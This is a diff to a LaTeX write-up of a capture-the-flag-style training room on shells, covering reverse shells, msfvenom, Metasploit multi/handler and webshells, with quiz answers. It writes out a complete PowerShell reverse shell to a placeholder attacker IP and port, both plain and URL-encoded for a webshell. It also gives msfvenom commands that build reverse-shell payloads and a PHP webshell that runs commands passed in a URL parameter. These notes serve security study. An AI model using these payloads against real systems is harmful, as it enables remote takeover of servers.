@@ -1,3 +1,6 @@
+\documentclass[../../WriteUp.tex]{subfiles}
+\input{format_Writeup_THM}
+\begin{document}
 \subsubsection*{What the Shell?}
 \addcontentsline{toc}{subsubsection}{What the Shell?}
 \T{What is a shell?}{
@@ -262,7 +265,7 @@ Similarly, for a reverse shell we use the command
 using the netcat connect syntax.\\
 
 For a Windows Server we need a Powershell reverse shell which we can get via:
-\cdnl{powershell -c "\$client = New-Object System.Net.Sockets.TCPClient('{\normalfont \textbf{<IP>}}',{\normalfont \textbf{<PORT>}});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|\%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0)\{;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>\&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\\ \$sendbyte,0,\$sendbyte.Length);\$stream.Flush()\};\$client.Close()"}
+\cdnl{\dt{powershell -c "\$client = New-Object System.Net.Sockets.TCPClient('{\normalfont \textbf{<IP>}}',{\normalfont \textbf{<PORT>}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|\%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>\&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write(\\ $sendbyte,0,$sendbyte.Length);$stream.Flush()\};$client.Close()"}}%$closemath
 Note that here the IP and Port need to be set to the attacking IP and port. This can be copied to a cmd.exe shell and run to get a Powershell reverse shell.\\
 
 For other shell payloads, we are directed to \href{https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology\%20and\%20Resources/Reverse\%20Shell\%20Cheatsheet.md}{PayloadAllTheThings}, where lots of one-liners are available for a myriad of different languages.
@@ -278,7 +281,7 @@ It is also recommended to search through the index of PayloadsAllTheThings
 As seen in the \nameref{MsfvenomTask} Task above, msfvenom is used to generate multitude payloads for any system we wish to access using Metasploit, as well as in multiple different formats, e.g \cd{.exe, .py} and many more.\\
 Recall the basic syntax for msfvenom:
 \cdnl{msfvenom -p <PAYLOAD> <OPTIONS>}
-(e.g \cd{msfvenom -p windows/x64/shell/reverse\_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>}
+(e.g \cd{\dt{msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>}}
 
 Some of the most relevant options are:
 \begin{itemize}
@@ -299,8 +302,8 @@ Staged payloads are harder to use and to detect, at least the initial stager. Mo
 
 We further have Meterpreter (more on it in the \nameref{subsubsec:Metasploit_Meterpreter} room) as a shell to take advantage of the payloads and exploits we run against the target. These shells are fully stable and can be switched "back and forth" between normal shells and Meterpreter shells, with multiple useful features such as hashdumps, file uploads and downloads and more. These shells must be caught in Meterpreter.\\
 
-The names for the payloads are usually given following the pattern \cd{<OS>/<arch>/<payload>}, e.g \cd{linux/x86/shell\_reverse\_tcp}, unless we are referring to Windows 32bit targets (x32), where the architecture is skipped (hence \cd{Windows/<payload>}.\\
-Stageless payloads are denoted with an underscore in the name (\cd{shell\_reverse\_tcp} as opposed to the slash-denoted staged payloads, e.g \cd{shell/reverse\_tcp}.\\
+The names for the payloads are usually given following the pattern \cd{<OS>/<arch>/<payload>}, e.g \cd{\dt{linux/x86/shell_reverse_tcp}}, unless we are referring to Windows 32bit targets (x32), where the architecture is skipped (hence \cd{Windows/<payload>}.\\
+Stageless payloads are denoted with an underscore in the name (\cd{\dt{shell_reverse_tcp}} as opposed to the slash-denoted staged payloads, e.g \cd{\dt{shell/reverse_tcp}}.\\
 This also applies to Meterpreter payloads.
 
 One can list all payloads with \cd{msfvenom --list payloads}, which can then be further piped to grep in the command line.
@@ -314,9 +317,65 @@ Which symbol is used to show that a shell is stageless?
 \QA{
 What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell
 }{
-\cdnl{msfvenom -p linux/x64/meterpreter/reverse\_tcp -f elf LHOST=10.10.10.5 LPORT=443 -o shell}
+\cdnl{\dt{msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf LHOST=10.10.10.5 LPORT=443 -o shell}}
 }
 }
-%\T{Metasploit multi/handler}{
-%
-%}
+\T{Metasploit multi/handler}{
+As we saw in \nameref{subsubsec:Metasploit_Exploitation}, we can (and almost have to) use Multi/Handler to catch reverse shells. We are forced to resort to it when we want to establish a Meterpreter shell and is the place to look for using staged payloads.\\
+
+To use the Multi/Handler, we first have to run the \cd{msfconsole} and then activate it via \cd{use multi/handler}.\\
+Once in the multi/handler, we see we can set the payload, LHOST and LPORT parameters as before with \cd{set <PARAM-NAME> <PARAMETER>}, e.g \cd{\dt{set PAYLOAD linux/x64/meterpreter/reverse_rcp}}\\
+Once ready, we run it with \cd{run -j}, with the \cd{-j} option set to run as a job in the background. When the desired payload is run on the target, Metasploit receives the connection, sends the rest of the payload and gives us the reverse shell. \\
+To use this shell we need to take it off the background we sent it to with \cd{sessions <session-nr>}.
+\QA{
+What command can be used to start a listener in the background?
+}{
+\cd{exploit -j}
+}
+\QA{
+If we had just received our tenth reverse shell in the current Metasploit session, what would be the command used to foreground it?
+}{
+\cd{sessions 10}
+}
+}
+\T{WebShells}{%
+Whenever we can upload code to a website, we have a possibility to upload code that allows us to establish a shell  on the server hosting the website, but unfortunately not always a certain one. In the cases when this is not possible, we want to upload a so-called \textbf{webshell}. We have covered this topic in a more detailed way in the \nameref{Upload_Vuln} Room.\\
+
+A webshell is an inofficial term for a script running inside a webserver, usually in PHP or ASP. It usually works as follows:\\
+The attacker enters commands in the webpage through a HTML form or as arguments in the URL, they are executed by the script and their output is displayed in the webpage. \\
+It best use relies in the avoidance of firewalls, and also as a stepping stone to land a more fully featured shell.\\
+
+With PHP being the most common server sude scripting language, the basic webshell has the format:
+\cdnl{\dt{<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>}} %$ to close math mode
+This code takes the \cd{GET} parameter and runs it on the target system within \cd{\dt{shell_exec()}}, i.e anythig we pass to the URL after \cd{?cmd=} will be run on the system, be it Windows or Linux.\\
+Note: the \cd{"<pre>"} are there to preserve formatting on the page.\\
+
+As an example, we have the vulnerable webpage from the \nameref{Upload_Vuln} with the URL \cd{10.10.84.199/uploads/shell.php?cmd=ifconfig}.
+
+On Kali we can find some pretailored webshells under \cd{usr/share/webshells}, including the \href{https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php}{PentestMonkey}
+reverse shell.\\
+
+When working against Windows targets, we can obtain RCE using a web shell or using msfvenom to generate a shell in the server's language. \\
+To get RCE with a webshell, we like to resort to a URL Encoded Powershell Reverse Shell, which is to be copied into the URL as the \cd{cmd} argument:
+\cdnl{powershell\%20-c\%20\%22\%24client\%20\%3D\%20New-Object\\
+\%20System.Net.Sockets.TCPClient\%28\%27{\normalfont{\textbf{<IP>}}}\%27\%2C{\normalfont{\textbf{<PORT>}}}\%29\%3B\%24\\
+stream\%20\%3D\%20\%24\\
+client.GetStream\%28\%29\%3B\%5Bbyte\%5B\%5D\%5D\%24bytes\%20\%3D\%200..65535\%7C\\
+\%25\%7B0\%7D\\
+\%3Bwhile\%28\%28\%24i\%20\%3D\%20\%24\\
+stream.Read\%28\%24bytes\%2C\%200\%2C\%20\%24bytes.Length\%29\%29\%20-ne\%200\%29\\
+\%7B\%3B\%24\\
+data\%20\%3D\%20\%28\\
+New-Object\%20-TypeName\%20System.Text.ASCIIEncoding\\
+\%29.GetString\%28\%24bytes\%2C0\%2C\%20\%24i\%29\%3B\%24\\
+sendback\%20\%3D\%20\%28iex\%20\%24data\%202\%3E\%261\%20\%7C\%20\\
+Out-String\%20\%29\%3B\%24sendback2\%20\%3D\%20\%24\\
+sendback\%20\%2B\%20\%27PS\%20\%27\%20\%2B\%20\%28pwd\%29.Path\%20\%2B\%20\%27\%3E\%20\%27\%3B\%24\\
+sendbyte\%20\%3D\%20\%28\%5Btext.encoding\%5D\%3A\%3AASCII\%29.GetBytes\%28\%24\\
+sendback2\%29\%3B\%24stream.Write\%28\%24sendbyte\%2C0\%2C\%24\\
+sendbyte.Length\%29\%3B\%24stream.Flush\%28\%29\%7D\%3B\%24\\
+client.Close\%28\%29\%22
+}
+Note that this has been URL encoded to be used without further need for adjustment (besides the bolded IP and PORT) in a GET parameter
+}
+\end{document}
